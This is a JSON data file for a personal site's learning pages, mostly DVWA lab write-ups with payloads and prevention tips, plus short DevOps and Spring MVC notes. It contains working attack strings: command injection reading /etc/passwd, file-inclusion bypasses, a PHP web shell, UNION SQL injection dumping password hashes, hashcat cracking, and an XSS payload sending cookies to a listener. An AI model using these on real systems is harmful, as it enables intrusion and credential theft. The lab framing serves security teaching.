@@ -1,0 +1,631 @@
+[
+  {
+    "slug": "dvwa",
+    "category": "Cybersecurity",
+    "icon": "shield",
+    "title": "DVWA Practical Security Lab",
+    "description": "Hands-on vulnerability testing with original lab evidence.",
+    "modules": [
+      {
+        "slug": "brute-force",
+        "title": "Brute Force",
+        "concept": "Burp Suite Intruder Cluster Bomb was performed on the login request. The username and password parameters were selected as payload positions, and the valid result was identified from the different response length.",
+        "objective": "Assess repeated login attempts through the DVWA authentication form in an authorized lab.",
+        "prerequisites": [
+          "An isolated, authorized DVWA training environment",
+          "A web browser with access to the DVWA module",
+          "Burp Suite configured to inspect the lab request"
+        ],
+        "steps": [
+          "Captured the DVWA login request in Burp Suite.",
+          "Selected username and password as payload positions.",
+          "Used Cluster Bomb to test both payload lists together.",
+          "Checked status code and response length to identify the successful login."
+        ],
+        "commands": [
+          {
+            "label": "Burp Intruder Setup",
+            "code": "Attack type: Cluster Bomb\nPosition 1: username\nPosition 2: password"
+          }
+        ],
+        "evidence": [
+          {
+            "image": "/images/learning/dvwa/brute-force/01-captured-request.png",
+            "title": "Captured login request",
+            "caption": "Captured the DVWA login request in Burp Suite to analyze parameters"
+          },
+          {
+            "image": "/images/learning/dvwa/brute-force/02-attack-type.png",
+            "title": "Cluster Bomb attack type selected",
+            "caption": "Attack type: Cluster Bomb — tests all combinations of username and password payloads"
+          },
+          {
+            "image": "/images/learning/dvwa/brute-force/03-payload-positions.png",
+            "title": "Username and password payload positions",
+            "caption": "Payload positions set on username and password parameters"
+          },
+          {
+            "image": "/images/learning/dvwa/brute-force/04-payload-list.png",
+            "title": "Payload list configured",
+            "caption": "Separate payload lists configured for each position"
+          },
+          {
+            "image": "/images/learning/dvwa/brute-force/05-result.png",
+            "title": "Intruder attack result",
+            "caption": "Intruder results sorted — valid credentials identified by different response length"
+          },
+          {
+            "image": "/images/learning/dvwa/brute-force/06-length-difference.png",
+            "title": "Different length showing valid response",
+            "caption": "Valid login response has different content length than failed attempts"
+          }
+        ],
+        "observations": "The login function allows repeated credential testing without strong protection.",
+        "findings": "The supplied DVWA lab screenshots document the observed behavior. These findings apply to the intentionally vulnerable training application, not to any third-party site.",
+        "prevention": [
+          "Limit repeated login attempts and monitor anomalous failures.",
+          "Use multi-factor authentication and safe password handling."
+        ]
+      },
+      {
+        "slug": "command-injection",
+        "title": "Command Injection",
+        "concept": "Command injection was tested through the Ping a device input field. Different command separators were used in Low, Medium, and High security levels to execute extra system commands.",
+        "objective": "Observe how DVWA handles metacharacters in the ping input at different security levels.",
+        "prerequisites": [
+          "An isolated, authorized DVWA training environment",
+          "A web browser with access to the DVWA module"
+        ],
+        "steps": [
+          "Entered payloads in the ping input field.",
+          "Low security allowed direct command chaining with semicolon.",
+          "Medium security was bypassed using single ampersand.",
+          "High security was bypassed using pipe without space."
+        ],
+        "commands": [
+          {
+            "label": "Low Security",
+            "code": "127.0.0.1; cat /etc/passwd"
+          },
+          {
+            "label": "Medium Security",
+            "code": "127.0.0.1 & cat /etc/passwd"
+          },
+          {
+            "label": "High Security",
+            "code": "127.0.0.1|ls"
+          }
+        ],
+        "evidence": [
+          {
+            "image": "/images/learning/dvwa/command-injection/01-low-result.png",
+            "title": "Low security command injection result",
+            "caption": "Payload: 127.0.0.1; cat /etc/passwd — semicolon chains a second command, dumping /etc/passwd"
+          },
+          {
+            "image": "/images/learning/dvwa/command-injection/02-medium-source.png",
+            "title": "Medium security source code blacklist",
+            "caption": "Source code blacklists && and ; but single & operator is not filtered"
+          },
+          {
+            "image": "/images/learning/dvwa/command-injection/03-medium-bypass.png",
+            "title": "Medium security bypass result",
+            "caption": "Payload: 127.0.0.1 & cat /etc/passwd — single ampersand bypasses the blacklist"
+          },
+          {
+            "image": "/images/learning/dvwa/command-injection/04-high-source.png",
+            "title": "High security source code bypass point",
+            "caption": "Payload: 127.0.0.1|ls — pipe without space bypasses high security filters"
+          }
+        ],
+        "observations": "The application places user input inside a system command without strict validation.",
+        "findings": "The supplied DVWA lab screenshots document the observed behavior. These findings apply to the intentionally vulnerable training application, not to any third-party site.",
+        "prevention": [
+          "Avoid shell commands with raw user input.",
+          "Use safe APIs, allow-listed arguments, and least-privilege processes."
+        ]
+      },
+      {
+        "slug": "csrf",
+        "title": "Cross-Site Request Forgery",
+        "concept": "The password change function was tested using a crafted URL request while the user session was active. After execution, the old password no longer worked.",
+        "objective": "Verify whether a state-changing password request can be triggered in an active DVWA session.",
+        "prerequisites": [
+          "An isolated, authorized DVWA training environment",
+          "A web browser with access to the DVWA module"
+        ],
+        "steps": [
+          "Created a password change request URL.",
+          "Executed the request while logged in.",
+          "Confirmed that the password was changed.",
+          "Verified that the old password failed after the request."
+        ],
+        "commands": [
+          {
+            "label": "Password Change Request",
+            "code": "http://localhost/DVWA/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change"
+          }
+        ],
+        "evidence": [
+          {
+            "image": "/images/learning/dvwa/csrf/01-request.png",
+            "title": "Captured CSRF request",
+            "caption": "Crafted URL: /vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change"
+          },
+          {
+            "image": "/images/learning/dvwa/csrf/02-valid-password.png",
+            "title": "Valid login before change",
+            "caption": "Password change executed successfully while user session was active"
+          },
+          {
+            "image": "/images/learning/dvwa/csrf/03-wrong-password.png",
+            "title": "Old password failed after change",
+            "caption": "Old password no longer works — confirms CSRF attack changed the credentials"
+          },
+          {
+            "image": "/images/learning/dvwa/csrf/04-after.png",
+            "title": "CSRF verification evidence",
+            "caption": "New password 'password' now works — CSRF vulnerability confirmed"
+          }
+        ],
+        "observations": "The password change action accepts a predictable request without strong CSRF protection.",
+        "findings": "The supplied DVWA lab screenshots document the observed behavior. These findings apply to the intentionally vulnerable training application, not to any third-party site.",
+        "prevention": [
+          "Use unpredictable CSRF tokens for state-changing operations.",
+          "Set appropriate SameSite cookies and check request origins."
+        ]
+      },
+      {
+        "slug": "file-inclusion",
+        "title": "File Inclusion",
+        "concept": "File inclusion was tested through the page parameter. Local file inclusion, remote file inclusion, medium bypass, and high security file:// bypass were demonstrated.",
+        "objective": "Investigate local and remote path inclusion through the DVWA page parameter.",
+        "prerequisites": [
+          "An isolated, authorized DVWA training environment",
+          "A web browser with access to the DVWA module"
+        ],
+        "steps": [
+          "Loaded the normal page using page=file1.php.",
+          "Used directory traversal to read /etc/passwd.",
+          "Tested remote URL inclusion.",
+          "Bypassed High security with file:///etc/passwd."
+        ],
+        "commands": [
+          {
+            "label": "Normal File",
+            "code": "http://localhost/DVWA/vulnerabilities/fi/?page=file1.php"
+          },
+          {
+            "label": "Low Security LFI",
+            "code": "http://localhost/DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd"
+          },
+          {
+            "label": "Remote File Inclusion",
+            "code": "http://localhost/DVWA/vulnerabilities/fi/?page=https://google.com"
+          },
+          {
+            "label": "Medium Security Bypass",
+            "code": "http://localhost/DVWA/vulnerabilities/fi/?page=..././..././..././..././..././..././etc/passwd"
+          },
+          {
+            "label": "High Security Bypass",
+            "code": "http://localhost/DVWA/vulnerabilities/fi/?page=file:///etc/passwd"
+          }
+        ],
+        "evidence": [
+          {
+            "image": "/images/learning/dvwa/file-inclusion/01-normal-page.png",
+            "title": "Normal file inclusion page",
+            "caption": "Normal: ?page=file1.php — application loads files based on user-supplied parameter"
+          },
+          {
+            "image": "/images/learning/dvwa/file-inclusion/02-lfi-passwd.png",
+            "title": "Local file inclusion reading /etc/passwd",
+            "caption": "LFI Payload: ?page=../../../../../../etc/passwd — directory traversal reads system files"
+          },
+          {
+            "image": "/images/learning/dvwa/file-inclusion/03-rfi-google.png",
+            "title": "Remote file inclusion test",
+            "caption": "RFI Payload: ?page=https://google.com — external URL loaded inside the application"
+          },
+          {
+            "image": "/images/learning/dvwa/file-inclusion/04-medium-bypass.png",
+            "title": "Medium security bypass",
+            "caption": "Medium Bypass: ?page=..././..././etc/passwd — double traversal bypasses ../ stripping"
+          },
+          {
+            "image": "/images/learning/dvwa/file-inclusion/05-high-source.png",
+            "title": "High security source code",
+            "caption": "High security checks if page starts with 'file' — but file:// protocol is still allowed"
+          },
+          {
+            "image": "/images/learning/dvwa/file-inclusion/06-high-file-bypass.png",
+            "title": "High security file:// bypass",
+            "caption": "High Bypass: ?page=file:///etc/passwd — file:// protocol reads local files"
+          }
+        ],
+        "observations": "The page parameter loads user-controlled file paths instead of using a strict allow-list.",
+        "findings": "The supplied DVWA lab screenshots document the observed behavior. These findings apply to the intentionally vulnerable training application, not to any third-party site.",
+        "prevention": [
+          "Use fixed server-side file mappings instead of raw file paths.",
+          "Disable remote file inclusion and validate resolved paths."
+        ]
+      },
+      {
+        "slug": "file-upload",
+        "title": "File Upload",
+        "concept": "A PHP shell file was uploaded through the image upload option and then accessed from the browser to execute commands using the cmd parameter.",
+        "objective": "Assess DVWA upload validation and the risk of executable files in a web-accessible directory.",
+        "prerequisites": [
+          "An isolated, authorized DVWA training environment",
+          "A web browser with access to the DVWA module"
+        ],
+        "steps": [
+          "Created shell.php with a command execution parameter.",
+          "Uploaded the file through DVWA File Upload.",
+          "Opened the uploaded file from the browser.",
+          "Executed pwd and ls commands through the URL."
+        ],
+        "commands": [
+          {
+            "label": "PHP Shell",
+            "code": "<?php echo shell_exec($_GET[\"cmd\"]); ?>"
+          },
+          {
+            "label": "Open Shell",
+            "code": "http://localhost/DVWA/hackable/uploads/shell.php?cmd=pwd"
+          },
+          {
+            "label": "List Files",
+            "code": "http://localhost/DVWA/hackable/uploads/shell.php?cmd=ls"
+          },
+          {
+            "label": "Root Directory List",
+            "code": "http://localhost/DVWA/hackable/uploads/shell.php?cmd=cd%20/;%20ls"
+          }
+        ],
+        "evidence": [
+          {
+            "image": "/images/learning/dvwa/file-upload/01-shell-code.png",
+            "title": "PHP shell source code",
+            "caption": "Shell file: <?php echo shell_exec($_GET['cmd']); ?> — executes any command via URL"
+          },
+          {
+            "image": "/images/learning/dvwa/file-upload/02-upload-success.png",
+            "title": "shell.php uploaded successfully",
+            "caption": "File uploaded to: ../../hackable/uploads/shell.php — stored in web-accessible directory"
+          },
+          {
+            "image": "/images/learning/dvwa/file-upload/03-pwd-result.png",
+            "title": "pwd command execution",
+            "caption": "URL: shell.php?cmd=pwd — returns current working directory on the server"
+          },
+          {
+            "image": "/images/learning/dvwa/file-upload/04-ls-result.png",
+            "title": "ls command execution",
+            "caption": "URL: shell.php?cmd=cd /; ls — lists root directory, proving full RCE"
+          }
+        ],
+        "observations": "The upload function accepts executable PHP files and stores them in a web-accessible location.",
+        "findings": "The supplied DVWA lab screenshots document the observed behavior. These findings apply to the intentionally vulnerable training application, not to any third-party site.",
+        "prevention": [
+          "Allow-list file types and validate actual content.",
+          "Store uploads outside executable web roots and disable script execution."
+        ]
+      },
+      {
+        "slug": "sql-injection",
+        "title": "SQL Injection",
+        "concept": "SQL injection was tested through the user ID input field. UNION-based payloads were used to show databases, tables, columns, and user password hashes.",
+        "objective": "Identify unsafe SQL query construction in the vulnerable DVWA user ID form.",
+        "prerequisites": [
+          "An isolated, authorized DVWA training environment",
+          "A web browser with access to the DVWA module",
+          "DVWA SQL Injection lab and the locally used hash-analysis tool"
+        ],
+        "steps": [
+          "Used UNION SELECT to enumerate database names.",
+          "Read table names from the dvwa database.",
+          "Extracted column names from the users table.",
+          "Retrieved usernames and password hashes, then cracked hashes using Hashcat."
+        ],
+        "commands": [
+          {
+            "label": "Show Databases",
+            "code": "-1' UNION SELECT 1, schema_name FROM information_schema.schemata #"
+          },
+          {
+            "label": "Show Tables",
+            "code": "-1' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema='dvwa' #"
+          },
+          {
+            "label": "Show Columns",
+            "code": "1' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users' #"
+          },
+          {
+            "label": "Read Users and Passwords",
+            "code": "1' UNION SELECT user, password FROM users #"
+          },
+          {
+            "label": "Hashcat",
+            "code": "hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 0 hash.txt --show"
+          }
+        ],
+        "evidence": [
+          {
+            "image": "/images/learning/dvwa/sql-injection/01-show-databases.png",
+            "title": "Database enumeration",
+            "caption": "Payload: -1' UNION SELECT 1, schema_name FROM information_schema.schemata #"
+          },
+          {
+            "image": "/images/learning/dvwa/sql-injection/02-query-explanation.png",
+            "title": "SQL payload explanation",
+            "caption": "UNION-based injection extracts data from information_schema"
+          },
+          {
+            "image": "/images/learning/dvwa/sql-injection/03-show-tables.png",
+            "title": "Table enumeration",
+            "caption": "Payload: -1' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema='dvwa' #"
+          },
+          {
+            "image": "/images/learning/dvwa/sql-injection/04-show-columns.png",
+            "title": "Column enumeration",
+            "caption": "Payload: 1' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users' #"
+          },
+          {
+            "image": "/images/learning/dvwa/sql-injection/05-read-users-passwords.png",
+            "title": "User and password hash extraction",
+            "caption": "Payload: 1' UNION SELECT user, password FROM users # — extracts credentials"
+          },
+          {
+            "image": "/images/learning/dvwa/sql-injection/06-hash-cracking.png",
+            "title": "Hash cracking result",
+            "caption": "hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt — MD5 hashes cracked"
+          }
+        ],
+        "observations": "User input is inserted into the SQL query without prepared statements.",
+        "findings": "The supplied DVWA lab screenshots document the observed behavior. These findings apply to the intentionally vulnerable training application, not to any third-party site.",
+        "prevention": [
+          "Use parameterized SQL queries rather than string concatenation.",
+          "Restrict database privileges and avoid exposing detailed SQL errors."
+        ]
+      },
+      {
+        "slug": "dom-xss",
+        "title": "DOM-Based XSS",
+        "concept": "DOM-based XSS was tested through the URL parameter used by the page JavaScript. The payload executed inside the browser.",
+        "objective": "Trace how client-side URL data flows into the DOM in the DVWA test page.",
+        "prerequisites": [
+          "An isolated, authorized DVWA training environment",
+          "A web browser with access to the DVWA module"
+        ],
+        "steps": [
+          "Placed the script payload in the default parameter.",
+          "Loaded the modified URL in the browser.",
+          "Confirmed execution through the alert popup."
+        ],
+        "commands": [
+          {
+            "label": "DOM XSS Payload",
+            "code": "default=<script>alert('XSS DOM')</script>"
+          }
+        ],
+        "evidence": [
+          {
+            "image": "/images/learning/dvwa/dom-xss/01-payload.png",
+            "title": "DOM XSS payload in URL",
+            "caption": "Payload: default=<script>alert('XSS DOM')</script> — injected via URL parameter"
+          },
+          {
+            "image": "/images/learning/dvwa/dom-xss/02-alert.png",
+            "title": "DOM XSS alert result",
+            "caption": "Result: JavaScript alert executed — confirms DOM-Based XSS vulnerability"
+          }
+        ],
+        "observations": "Client-side script writes URL input into the page without proper encoding.",
+        "findings": "The supplied DVWA lab screenshots document the observed behavior. These findings apply to the intentionally vulnerable training application, not to any third-party site.",
+        "prevention": [
+          "Avoid writing untrusted URL data into unsafe DOM sinks.",
+          "Use safe text APIs and context-specific encoding."
+        ]
+      },
+      {
+        "slug": "reflected-xss",
+        "title": "Reflected XSS",
+        "concept": "Reflected XSS was tested through an input field where submitted data was returned in the page response and executed by the browser.",
+        "objective": "Demonstrate how unencoded reflected input can execute inside the DVWA page.",
+        "prerequisites": [
+          "An isolated, authorized DVWA training environment",
+          "A web browser with access to the DVWA module"
+        ],
+        "steps": [
+          "Submitted JavaScript in the input field.",
+          "The page reflected the payload in the response.",
+          "The browser executed the script and displayed cookie data."
+        ],
+        "commands": [
+          {
+            "label": "Basic Alert",
+            "code": "<script>alert(0)</script>"
+          },
+          {
+            "label": "Cookie Alert",
+            "code": "<script>alert(document.cookie)</script>"
+          }
+        ],
+        "evidence": [
+          {
+            "image": "/images/learning/dvwa/reflected-xss/01-payload.png",
+            "title": "Reflected XSS payload",
+            "caption": "Payload: <script>alert(document.cookie)</script> — injected in the input field"
+          },
+          {
+            "image": "/images/learning/dvwa/reflected-xss/02-cookie-alert.png",
+            "title": "Cookie alert result",
+            "caption": "Result: Session cookie displayed — sensitive browser data accessible via reflected XSS"
+          }
+        ],
+        "observations": "User input is reflected into the response without sanitization or output encoding.",
+        "findings": "The supplied DVWA lab screenshots document the observed behavior. These findings apply to the intentionally vulnerable training application, not to any third-party site.",
+        "prevention": [
+          "Apply context-aware output encoding.",
+          "Avoid injecting user input into executable HTML or script contexts."
+        ]
+      },
+      {
+        "slug": "stored-xss",
+        "title": "Stored XSS",
+        "concept": "Stored XSS was tested through the message field. The payload was saved by the application and executed again whenever the stored message loaded.",
+        "objective": "Confirm that unsafe stored input executes when the DVWA message is reloaded.",
+        "prerequisites": [
+          "An isolated, authorized DVWA training environment",
+          "A web browser with access to the DVWA module"
+        ],
+        "steps": [
+          "Submitted the XSS payload in the message field.",
+          "The application stored the payload.",
+          "The script executed automatically when the message was displayed."
+        ],
+        "commands": [
+          {
+            "label": "Stored Cookie Alert",
+            "code": "<script>alert(document.cookie)</script>"
+          }
+        ],
+        "evidence": [
+          {
+            "image": "/images/learning/dvwa/stored-xss/01-message.png",
+            "title": "Stored XSS message",
+            "caption": "Payload: <script>alert(document.cookie)</script> — submitted in message field and stored"
+          },
+          {
+            "image": "/images/learning/dvwa/stored-xss/02-execution.png",
+            "title": "Stored XSS execution",
+            "caption": "Result: Stored payload executes on page load — cookie alert fires on every visit"
+          }
+        ],
+        "observations": "Stored user input is displayed later without sanitization or output encoding.",
+        "findings": "The supplied DVWA lab screenshots document the observed behavior. These findings apply to the intentionally vulnerable training application, not to any third-party site.",
+        "prevention": [
+          "Encode stored content when displayed.",
+          "Sanitize allowed rich content using an audited sanitizer."
+        ]
+      },
+      {
+        "slug": "cookie-stealing",
+        "title": "Cookie Stealing",
+        "concept": "A Python HTTP server was created on the lab attacker machine, and an XSS payload sent the browser cookie to that server.",
+        "objective": "Demonstrate the risk of cookie exposure from injected scripts in an isolated local DVWA environment.",
+        "prerequisites": [
+          "An isolated, authorized DVWA training environment",
+          "A web browser with access to the DVWA module",
+          "A local-only listener in the training environment"
+        ],
+        "steps": [
+          "Started a Python HTTP server on port 8000.",
+          "Injected a fetch payload that sends document.cookie to the listener.",
+          "Confirmed the cookie value in the HTTP server log."
+        ],
+        "commands": [
+          {
+            "label": "Create Server",
+            "code": "python3 -m http.server 8000"
+          },
+          {
+            "label": "Cookie Capture Payload",
+            "code": "<script>fetch(\"http://192.168.220.128:8000/?cookie=\" + document.cookie)</script>"
+          }
+        ],
+        "evidence": [
+          {
+            "image": "/images/learning/dvwa/cookie-stealing/01-server.png",
+            "title": "Python HTTP server started",
+            "caption": "Attacker server: python3 -m http.server 8000 — listening for incoming cookie data"
+          },
+          {
+            "image": "/images/learning/dvwa/cookie-stealing/02-cookie-log.png",
+            "title": "Cookie received in server log",
+            "caption": "Result: Victim's cookie captured in HTTP request log — <script>fetch('...?cookie=' + document.cookie)</script>"
+          }
+        ],
+        "observations": "The page executes user-supplied JavaScript, allowing document.cookie to be read inside the browser.",
+        "findings": "The supplied DVWA lab screenshots document the observed behavior. These findings apply to the intentionally vulnerable training application, not to any third-party site.",
+        "prevention": [
+          "Prevent script injection with output encoding and safe DOM APIs.",
+          "Use HttpOnly and Secure cookies where applicable."
+        ]
+      }
+    ]
+  },
+  {
+    "slug": "devops",
+    "category": "DevOps",
+    "icon": "terminal",
+    "title": "Spring Boot Deployment Workflow",
+    "description": "Real GitHub Actions, Docker, EC2, Nginx and Terraform notes.",
+    "modules": [
+      {
+        "slug": "deployment-workflow",
+        "title": "From Git Push to HTTPS",
+        "concept": "The existing Spring Boot project uses GitHub Actions to publish Docker images, then runs a container behind Nginx on AWS EC2.",
+        "objective": "Document the working deployment chain already used in the project.",
+        "prerequisites": [
+          "Existing Spring Boot application",
+          "Existing GitHub Actions, Docker Hub and AWS EC2 setup"
+        ],
+        "steps": [
+          "Develop and test Spring Boot locally, then push a meaningful Git change.",
+          "GitHub Actions builds a commit-tagged Docker image and pushes it to Docker Hub.",
+          "The Ubuntu EC2 server starts the image in a container bound to localhost.",
+          "Nginx serves incoming traffic using HTTPS; Terraform manages infrastructure separately."
+        ],
+        "commands": [],
+        "evidence": [],
+        "observations": "GitHub Actions automates image delivery, while Nginx handles public HTTPS requests to the application.",
+        "findings": "The deployment separates application releases from infrastructure updates. Each image can be traced to a commit.",
+        "prevention": [
+          "Keep deployment credentials in protected GitHub secrets or environment variables.",
+          "Do not expose the application container port publicly when Nginx is the entry point."
+        ]
+      }
+    ]
+  },
+  {
+    "slug": "backend",
+    "category": "Java",
+    "icon": "code",
+    "title": "Spring Boot MVC Notes",
+    "description": "Controller routing, templates and configuration from this website.",
+    "modules": [
+      {
+        "slug": "mvc-thymeleaf",
+        "title": "Spring MVC and Thymeleaf",
+        "concept": "The website uses Spring MVC controllers to map routes to Thymeleaf templates while retaining the existing REST welcome endpoint.",
+        "objective": "Understand how the current project separates page rendering from an API.",
+        "prerequisites": [
+          "An existing Spring Boot MVC application",
+          "Basic Java knowledge"
+        ],
+        "steps": [
+          "Annotate a controller class with @Controller.",
+          "Map a page endpoint using @GetMapping.",
+          "Return the matching Thymeleaf template name.",
+          "Use Thymeleaf fragments for shared navigation and layout."
+        ],
+        "commands": [
+          {
+            "label": "Simple Spring MVC controller",
+            "code": "@Controller\npublic class HomeController {\n    @GetMapping(\"/\")\n    public String home() { return \"index\"; }\n}"
+          }
+        ],
+        "evidence": [],
+        "observations": "The existing /api/welcome endpoint remains separate from the view controllers.",
+        "findings": "Shared fragments and model-backed pages reduce repeated HTML and support future structured content.",
+        "prevention": [
+          "Do not commit keys or credentials to application properties.",
+          "Keep route handlers focused and avoid repeating view markup."
+        ]
+      }
+    ]
+  }
+]
